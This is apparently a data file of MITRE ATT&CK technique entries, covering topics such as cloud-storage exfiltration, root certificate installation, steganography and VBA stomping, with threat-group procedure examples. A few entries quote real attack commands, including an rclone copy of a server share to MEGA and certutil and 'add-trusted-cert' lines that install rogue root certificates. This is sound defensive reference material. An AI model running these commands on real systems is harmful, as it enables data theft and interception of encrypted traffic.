T1595.003,Wordlist Scanning,"Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to [Brute Force] its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: [Gather Victim Org Information] or [Search Victim-Owned Websites]  For example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website’s pages and directories. This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: [Exploit Public-Facing Application] or [Brute Force]    As cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure. Once storage objects are discovered, adversaries may leverage [Data from Cloud Storage] to access valuable information that can be exfiltrated or used to escalate privileges and move laterally. ","['[APT41] leverages various tools and frameworks to brute-force directories on web servers.', '[Volatile Cedar] has used DirBuster and GoBuster to brute force web directories and DNS subdomains.']",False
T1562.011,Spoof Security Alerting,"Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders’ awareness of malicious activity. Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.  Rather than or in addition to [Indicator Blocking] an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., [Disable or Modify Tools] An adversary can also present a “healthy” system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.  For example, adversaries may show a fake Windows Security GUI and tray icon with a “healthy” system status after Windows Defender and other system tools have been disabled.",[],False
T1137.004,Outlook Home Page,"Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.  Once malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded. ","['[OilRig] has abused the Outlook Home Page feature for persistence. [OilRig] has also used CVE-2017-11774 to roll back the initial patch designed to protect against Home Page abuse.', '[Ruler] can be used to automate the abuse of Outlook Home Pages to establish persistence. ']",
T1573.002,Asymmetric Cryptography,"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.  For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography]","['[SombRAT] can SSL encrypt C2 traffic.', '[Uroburos] has used a combination of a Diffie-Hellman key exchange mixed with a pre-shared key (PSK) to encrypt its top layer of C2 communications.', '[Cyclops Blink] can encrypt C2 messages with AES-256-CBC sent underneath TLS. OpenSSL library functions are also used to encrypt each message using a randomly generated key and IV, which are then encrypted using a hard-coded RSA public key.', '[Emotet] is known to use RSA keys for encrypting C2 traffic. ', '[PITSTOP] has the ability to communicate over TLS.', '[TA2541] has used TLS encrypted C2 communications including for campaigns using AsyncRAT.', 'During [Operation Wocao] threat actors\' proxy implementation ""Agent"" upgraded the socket in use to a TLS socket.', '[Metamorfo] C2 communication has been encrypted using OpenSSL. ', '[Sykipot] uses SSL for encrypting C2 communications.', '[Bazar] can use TLS in C2 communications.', '[TinyTurla] has the ability to encrypt C2 traffic with SSL/TLS.', '[SodaMaster] can use a hardcoded RSA key to encrypt some of its C2 traffic.', '[ComRAT] can use SSL/TLS encryption for its HTTP-based C2 channel. [ComRAT] has used public key cryptography with RSA and AES encrypted email attachments for its Gmail C2 channel. ', '[REvil] has encrypted C2 communications with the ECIES algorithm.', '[Gazer] uses custom encryption for C2 that uses RSA.', '[Pay2Key] has used RSA encrypted communications with C2.', '[Grandoreiro] can use SSL in C2 communication.', '[Pupy] default encryption for its C2 communication channel is SSL, but it also has transport options for RSA and AES.', '[ServHelper] may set up a reverse SSH tunnel to give the attacker access to services running on the victim, such as RDP.', '[Mythic] supports SSL encrypted C2.\t', '[GrimAgent] can use a hardcoded server public RSA key to encrypt the first request to C2.', '[Attor] Blowfish key is encrypted with a public RSA key.', '[Doki] has used the embedTLS library for network communications.', '[Dridex] has encrypted traffic with RSA.', '[WellMess] can communicate to C2 with mutual TLS where client and server mutually check certificates.', '[Tropic Trooper] has used SSL to connect to C2 servers.', '[Small Sieve] can use SSL/TLS for its HTTPS Telegram Bot API-based C2 channel.', '[LITTLELAMB.WOOLTEA] can communicate over SSL using the private key from the Ivanti Connect Secure web server.', '[Carbon] has used RSA encryption for C2 communications.', '[Tor] encapsulates traffic in multiple layers of encryption, using TLS by default.', '[GoldMax] has RSA-encrypted its communication with the C2 server.', '[Sliver] can use mutual TLS and RSA  cryptography to exchange a session key.', '[Woody RAT] can use RSA-4096 to encrypt data sent to its C2 server. ', '[GreyEnergy] encrypts communications using RSA-2048.', '[BADHATCH] can beacon to a hardcoded C2 IP address using TLS encryption every 5 minutes.', '[DarkWatchman] can use TLS to encrypt its C2 channel.', '[COATHANGER] connects to command and control infrastructure using SSL.', '[Trojan.Karagany] can secure C2 communications with SSL and TLS.', '[OilRig] used the Plink utility and other tools to create tunnels to C2 servers.', '[Penquin] can encrypt communications using the BlowFish algorithm and a symmetric key exchanged with Diffie Hellman.', '[Machete] has used TLS-encrypted FTP to exfiltrate data.', '[Cobalt Strike] can use RSA asymmetric encryption with PKCS1 padding to encrypt data sent to the C2 server.', 'Some [Volgmer] variants use SSL to encrypt C2 communications.', '[Hi-Zor] encrypts C2 traffic with TLS.', '[StrongPity] has encrypted C2 traffic using SSL/TLS.', '[Rising Sun] variants can use SSL for encrypting C2 communications.', '[POSHSPY] encrypts C2 traffic with AES and RSA.', '[XTunnel] uses SSL/TLS and RC4 to encrypt traffic.', 'During [C0021] the threat actors used SSL via TCP port 443 for C2 communications.', '[KEYPLUG] can use TLS-encrypted WebSocket Protocol (WSS) for C2.', '[POWERSTATS] has encrypted C2 traffic with RSA.', '[Zebrocy] uses SSL and AES ECB for encrypting C2 communications. ', '[PoetRAT] used TLS to encrypt command and control (C2) communications.', '[Cobalt Group] has used the Plink utility to create SSH tunnels.', 'A variant of [ADVSTORESHELL] encrypts some C2 with RSA.', '[Mispadu] contains a copy of the OpenSSL library to encrypt C2 traffic. ', '[Sardonic] has the ability to send a random 64-byte RC4 key to communicate with actor-controlled C2 servers by using an RSA public key.', '[Koadic] can use SSL and TLS for communications.', '[WannaCry] uses [Tor] for command and control traffic and routes a custom cryptographic protocol over the [Tor] circuit.', '[FIN6] used the Plink command-line utility to create SSH tunnels to C2 servers.', '[Empire] can use TLS to encrypt its C2 channel.', '[FIN8] has used the Plink utility to tunnel RDP back to C2 infrastructure.', '[BISCUIT] uses SSL for encrypting C2 communications.', '[adbupd] contains a copy of the OpenSSL library to encrypt C2 traffic.', '[Kobalos] authentication and key exchange is performed using RSA-512. ', '[WellMail] can use hard coded client and certificate authority certificates to communicate with C2 over mutual TLS.', '[CHOPSTICK] encrypts C2 communications with TLS.', '[IcedID] has used SSL and TLS in communications with C2.', '[Operation Wocao] proxy implementation ""Agent"" can upgrade the socket in use to a TLS socket.']",False
T1567.002,Exfiltration to Cloud Storage,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.  Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ","['[Leviathan] has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.', '[Akira] will exfiltrate victim data using applications such as [Rclone]', '[LuminousMoth] has exfiltrated data to Google Drive.', '[Rclone] can exfiltrate data to cloud storage services such as Dropbox, Google Drive, Amazon S3, and MEGA.', '[RainyDay] can use a file exfiltration tool to upload specific files to Dropbox.\t  ', '[CreepyDrive] can use cloud services including OneDrive for data exfiltration.', '[HAMMERTOSS] exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.', '[Kimsuky] has exfiltrated stolen files and data to actor-controlled Blogspot accounts.', '[Threat Group-3390] has exfiltrated stolen data to Dropbox.', '[Confucius] has exfiltrated victim data to cloud storage service accounts.', '[POLONIUM] has exfiltrated stolen data to [POLONIUM] OneDrive and Dropbox accounts. ', '[HEXANE] has used cloud services, including OneDrive, for data exfiltration.', 'During [C0015] the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the [Rclone] command `rclone.exe copy --max-age 2y ""\\\\SERVER\\Shares"" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`.', ""[Clambling] can send files from a victim's machine to Dropbox."", '[Cinnamon Tempest] has uploaded captured keystroke logs to the Alibaba Cloud Object Storage Service, Aliyun OSS.', '[Crutch] has exfiltrated stolen data to Dropbox.', '[Octopus] has exfiltrated data to file sharing sites.', '[Wizard Spider] has exfiltrated stolen victim data to various cloud storage providers. ', '[Turla] has used WebDAV to upload stolen USB files to a cloud drive. [Turla] has also exfiltrated stolen files to OneDrive and 4shared.', '[HAFNIUM] has exfiltrated data to file sharing sites, including MEGA.', '[Empire] can use Dropbox for data exfiltration.', '[Earth Lusca] has used the megacmd tool to upload stolen files from a victim network to MEGA.', '[ToddyCat] has used a DropBox uploader to exfiltrate stolen files.', '[ZIRCONIUM] has exfiltrated stolen data to Dropbox.', ""[BoxCaon] has the capability to download folders' contents on the system and upload the results back to its Dropbox drive."", 'During [Operation Dream Job] [Lazarus Group] used a custom build of open-source command-line dbxcli to exfiltrate stolen data to Dropbox.', '[Pcexter] can upload stolen files to OneDrive storage accounts via HTTP `POST`.', '[Chimera] has exfiltrated stolen data to OneDrive accounts.', '[Scattered Spider] has exfiltrated victim data to the MEGA file sharing site.', '[ROKRAT] can send collected data to cloud storage services such as PCloud.', '[BoomBox] can upload data to dedicated per-victim folders in Dropbox.', '[FIN7] has exfiltrated stolen data to the MEGA file sharing site.', '[Lazarus Group] has exfiltrated stolen data to Dropbox using a customized version of dbxcli.']",False
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.  Service paths  and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\unsafe path with space\program.exe</code> vs. <code>""C:\safe path with space\program.exe""</code>).  (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\program files\myapp.exe</code>, an adversary may create a program at <code>C:\program.exe</code> that will be run instead of the intended program.    This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.","['[PowerSploit] contains a collection of Privesc-PowerUp modules that can discover and exploit unquoted path vulnerabilities.', '[Empire] contains modules that can discover and exploit unquoted path vulnerabilities.']",False
T1608.003,Install Digital Certificate,"Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.  Adversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography] with [Web Protocols] or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers.   Adversaries can obtain digital certificates (see [Digital Certificates] or create self-signed certificates (see [Digital Certificates] Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ([Acquire Infrastructure] or previously compromised ([Compromise Infrastructure]",[],
T1037.005,Startup Items,"Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.  This is technically a deprecated technology (superseded by [Launch Daemon] and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory.   An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism. Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.",['[jRAT] can list and manage startup entries.'],False
T1614.001,System Language Discovery,"Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.  There are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Query Registry] and calls to [Native API] functions.   For example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.  On a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.","['During [Operation Dream Job] [Lazarus Group] deployed malware designed not to run on computers set to Korean, Japanese, or Chinese in Windows language preferences.', ""[MarkiRAT] can use the <code>GetKeyboardLayout</code> API to check if a compromised host's keyboard is set to Persian."", ""[XCSSET] uses AppleScript to check the host's language and location with the command <code>user locale of (get system info)</code>."", '[Cuba] can check if Russian language is installed on the infected machine by using the function <code>GetKeyboardLayoutList</code>. ', '[Ke3chang] has used implants to collect the system language ID of a compromised machine.', '[Flagpro] can check whether the target system is using Japanese, Taiwanese, or English through detection of specific Windows Security and Internet Explorer dialog. ', '[Avaddon] checks for specific keyboard layouts and OS languages to avoid targeting Commonwealth of Independent States (CIS) entities.', '[Maze] has checked the language of the machine with function <code>GetUserDefaultUILanguage</code> and terminated execution if the language matches with an entry in the predefined list.', '[Mispadu] checks and will terminate execution if the compromised system’s language ID is not Spanish or Portuguese.', '[Spark] has checked the results of the <code>GetKeyboardLayoutList</code> and the language name returned by <code>GetLocaleInfoA</code> to make sure they contain the word “Arabic” before executing.', '[Ryuk] has been observed to query the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> and the value <code>InstallLanguage</code>. If the machine has the value 0x419 (Russian), 0x422 (Ukrainian), or 0x423 (Belarusian), it stops execution.', '[S-Type] has attempted to determine if a compromised system was using a Japanese keyboard via the `GetKeyboardType` API call.', ""[Bazar] can perform a check to ensure that the operating system's keyboard and language settings are not set to Russian."", 'Some versions of [DEATHRANSOM] have performed language ID and keyboard layout checks; if either of these matched Russian, Kazakh, Belarusian, Ukrainian or Tatar [DEATHRANSOM] would exit.', '[Neoichor] can identify the system language on a compromised host.', '[Clop] has checked the keyboard language using the GetKeyboardLayout() function to avoid installation on Russian-language or other Commonwealth of Independent States-language machines; it will also check the <code>GetTextCharset</code> function. ', ""[Zeus Panda] queries the system's keyboard mapping to determine the language used on the system. It will terminate execution if it detects LANG_RUSSIAN, LANG_BELARUSIAN, LANG_KAZAK, or LANG_UKRAINIAN."", '[GrimAgent] has used <code>Accept-Language</code> to identify hosts in the United Kingdom, United States, France, and Spain. ', ""[DropBook] has checked for the presence of Arabic language in the infected machine's settings."", '[REvil] can check the system language using <code>GetUserDefaultUILanguage</code> and <code>GetSystemDefaultUILanguage</code>. If the language is found in the list, the process terminates. ', '[SynAck] lists all the keyboard layouts installed on the victim’s system using <code>GetKeyboardLayoutList</code> API and checks against a hardcoded language code list. If a match if found, SynAck sleeps for 300 seconds and then exits without encrypting files. ', '[Misdat] has attempted to detect if a compromised host had a Japanese keyboard via the Windows API call `GetKeyboardType`.', '[SharpStage]  has been used to target Arabic-speaking users and used code that checks if the compromised machine has the Arabic language installed.', '[Malteiro] will terminate [Mispadu] infection process if the language of the victim machine is not Spanish or Portuguese.', '[Lazarus Group] has deployed malware designed not to run on computers set to Korean, Japanese, or Chinese in Windows language preferences.']",
T1027.003,Steganography,"Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.  [Duqu] was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.   By the end of 2017, a threat group used <code>Invoke-PSImage</code> to hide [PowerShell] commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell] code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.  ","['[Earth Lusca] has used steganography to hide shellcode in a BMP image file.', '[RDAT] can also embed data within a BMP image prior to exfiltration.\t', '[PowerDuke] uses steganography to hide backdoors in PNG files, which are also encrypted using the Tiny Encryption Algorithm (TEA). ', ""For [Operation Spalax] the threat actors used packers that read pixel data from images contained in PE files' resource sections and build the next layer of execution from the data."", '[APT37] uses steganography to send images to users that are embedded with shellcode.', '[LiteDuke] has used image files to hide its loader component.', '[BBK] can extract a malicious Portable Executable (PE) from a photo.', '[RegDuke] can hide data in images, including use of the Least Significant Bit (LSB).', '[build_downer] can extract malware from a downloaded JPEG.', '[Okrum] payload is encrypted and embedded within its loader, or within a legitimate PNG file.', '[Bandook] has used .PNG images within a zip file to build the executable. ', '[TA551] has hidden encoded data for malware DLLs in a PNG.', '[Diavol] has obfuscated its main code routines within bitmap images as part of its anti-analysis techniques. ', '[Leviathan] has used steganography to hide stolen data inside other files stored on Github.', '[Ramsay] has PE data embedded within JPEG files contained within Word documents.', '[ObliqueRAT] can hide its payload in BMP images hosted on compromised websites.', '[IcedID] has embedded binaries within RC4 encrypted .png files.', '[ABK] can extract a malicious Portable Executable (PE) from a photo.', '[ProLock] can use .jpg and .bmp files to store its payload.', '[MuddyWater] has stored obfuscated JavaScript code in an image file named temp.jpg.', '[Invoke-PSImage] can be used to embed a PowerShell script within the pixels of a PNG file.', 'During [Operation Ghost] [APT29] used steganography to hide payloads inside valid images.', '[Raindrop] used steganography to locate the start of its encoded payload within legitimate 7-Zip code.', '[Avenger] can extract backdoor malware from downloaded images.', '[Andariel] has hidden malicious executables within PNG files.', '[Tropic Trooper] has used JPG files with encrypted payloads to mask their backdoor routines and evade detection.', '[PolyglotDuke] can use steganography to hide C2 information in images.', '[BRONZE BUTLER] has used steganography in multiple operations to conceal malicious payloads.']",
T1584.002,DNS Server,"Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol] Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.  By compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.  Additionally, adversaries may leverage such control in conjunction with [Digital Certificates] to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications. Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.","[""[LAPSUS$] has reconfigured a victim's DNS records to actor-controlled domains and websites.""]",False
T1001.003,Protocol Impersonation,"Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.    Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. ","['[Lazarus Group] malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, potentially evading SSL traffic inspection/decryption.', '[FRAMESTING] uses a cookie named `DSID` to mimic the name of a cookie used by Ivanti Connect Secure appliances for maintaining VPN sessions.', '[Cobalt Strike] can mimic the HTTP protocol for C2 communication, while hiding the actual data in either an HTTP header, URI parameter, the transaction body, or appending it to the URI.', '[BADCALL] uses a FakeTLS method during C2.', '[KeyBoy] uses custom SSL libraries to impersonate SSL in C2 traffic.', '[Higaisa] used a FakeTLS session for C2 communications.', '[TAINTEDSCRIBE] has used FakeTLS for session authentication.', '[Bankshot] generates a false TLS handshake using a public certificate to disguise C2 network communications.', '[HARDRAIN] uses FakeTLS to communicate with its C2 server.', '[Uroburos] can use custom communication methodologies that ride over common  protocols including TCP, UDP, HTTP, SMTP, and DNS in order to blend with normal network traffic. ', '[SUNBURST] masqueraded its network traffic as the Orion Improvement Program (OIP) protocol.', 'During [C0017] [APT41] frequently configured the URL endpoints of their stealthy passive backdoor LOWKEY.PASSIVE to masquerade as normal web application traffic on an infected server.', '[InvisiMole] can mimic HTTP protocol with custom HTTP “verbs” HIDE, ZVVP, and NOP.', '[Ninja] has the ability to mimic legitimate services with customized HTTP URL paths and headers to hide malicious traffic.', '[FakeM] C2 traffic attempts to evade detection by resembling data generated by legitimate messenger applications, such as MSN and Yahoo! messengers. Additionally, some variants of [FakeM] use modified SSL code for communications back to C2 servers, making SSL decryption ineffective.', '[FALLCHILL] uses fake Transport Layer Security (TLS) to communicate with its C2 server.', '[Okrum] mimics HTTP protocol for C2 communication, while hiding the actual messages in the Cookie and Set-Cookie headers of the HTTP requests.']",
T1550.004,Web Session Cookie,"Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.  Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie] or [Web Cookies] the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.  There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.","['During the [SolarWinds Compromise] [APT29] used stolen cookies to access cloud resources and a forged `duo-sid` cookie to bypass MFA set on an email account.', '[APT29] used stolen cookies to access cloud resources, and a forged <code>duo-sid</code> cookie to bypass MFA set on an email account.', '[UNC2452] used a forged <code>duo-sid</code> cookie to bypass MFA set on an email account.']",False
T1078.002,Domain Accounts,"Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.  Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping] or password reuse, allowing access to privileged resources of the domain.","['[CreepySnail] can use stolen credentials to authenticate on target networks.', 'During [Night Dragon] threat actors used domain accounts to gain further access to victim systems.', 'For [Operation Ghost] [APT29] used stolen administrator credentials for lateral movement on compromised networks.', '[Cobalt Strike] can use known credentials to run commands and spawn processes as a domain user account.', '[Naikon] has used administrator credentials for lateral movement in compromised networks.', 'During [Operation CuckooBees] the threat actors used compromised domain administrator credentials as part of their lateral movement. ', '[Wizard Spider] has used administrative accounts, including Domain Admin, to move laterally within a victim network.', '[Sandworm Team] has used stolen credentials to access administrative accounts within the domain.', ""During the [SolarWinds Compromise] [APT29] used domain administrators' accounts to help facilitate lateral movement on compromised networks."", '[Ryuk] can use stolen domain admin accounts to move laterally within a victim domain.', 'If [Shamoon] cannot access shares using current privileges, it attempts access using hard coded, domain-specific credentials gathered earlier in the intrusion.', '[Cinnamon Tempest] has obtained highly privileged credentials such as domain administrator in order to deploy malware.', '[ToddyCat] has used compromised domain admin credentials to mount local network shares.', '[Indrik Spider] has collected credentials from infected systems, including domain accounts.', '[APT3] leverages valid accounts after gaining credentials for use within the victim domain.', '[Chimera] has used compromised domain accounts to gain access to the target environment.', 'During [Operation Wocao] threat actors used domain credentials, including domain admin, for lateral movement and privilege escalation.', '[TA505] has used stolen domain admin accounts to compromise additional hosts.', ""[Threat Group-1314] actors used compromised domain credentials for the victim's endpoint management platform, Altiris, to move laterally."", '[APT5] has used legitimate account credentials to move laterally through compromised environments.', '[Magic Hound] has used domain administrator accounts after dumping LSASS process memory.', 'During [Cutting Edge] threat actors used compromised VPN accounts for lateral movement on targeted networks.', '[Stuxnet] attempts to access network resources with a domain account’s credentials.', '[Volt Typhoon] has used compromised domain accounts to authenticate to devices on compromised networks.', '[APT29] has used valid accounts, including administrator accounts, to help facilitate lateral movement on compromised networks.', '[Operation Wocao] has used domain credentials, including domain admin, for lateral movement and privilege escalation.', '[Cobalt Strike] can use known credentials to run commands and spawn processes as a domain user account.']",False
T1218.009,Regsvcs/Regasm,Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model] (COM) assemblies. Both are binaries that may be digitally signed by Microsoft.    Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. ,['[Agent Tesla] has dropped RegAsm.exe onto systems for performing malicious activity. '],
T1553.004,Install Root Certificate,"Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.  Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.  Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle] capability for intercepting information transmitted over secure TLS/SSL communications.  Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.  In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.","['[certutil] can be used to install browser root certificates as a precursor to performing [Adversary-in-the-Middle] between connections to banking websites. Example command: <code>certutil -addstore -f -user ROOT ProgramData\\cert512121.der</code>.', '[Dok] installs a root certificate to aid in [Adversary-in-the-Middle] actions using the command <code>add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/filename</code>.', '[Hikit] installs a self-generated certificate to the local trust store as a root CA and Trusted Publisher.', '[RTM] can add a certificate to the Windows store.']",False
T1037.003,Network Logon Script,"Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects. These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.     Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",[],
T1027.004,Compile After Delivery,"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.  Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing] Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.","['[Gamaredon Group] has compiled the source code for a downloader directly on the infected system using the built-in <code>Microsoft.CSharp.CSharpCodeProvider</code> class.\t', '[FoggyWeb] can compile and execute source code sent to the compromised AD FS server via a specific HTTP POST.', '[Rocke] has compiled malware, delivered to victims as .c files, with the GNU Compiler Collection (GCC).\t', '[MuddyWater] has used the .NET csc.exe tool to compile executables from downloaded C# code.', '[njRAT] has used AutoIt to compile the payload and main script into a single executable after delivery.', '[Cardinal RAT] and its watchdog component are compiled and executed after being delivered to victims as embedded, uncompiled source code.', '[Samurai] can compile and execute downloaded modules at runtime.', '[DarkWatchman] has used the <code>csc.exe</code> tool to compile a C# executable. ']",
T1564.007,VBA Stomping,"Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.  MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.  An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.",[],
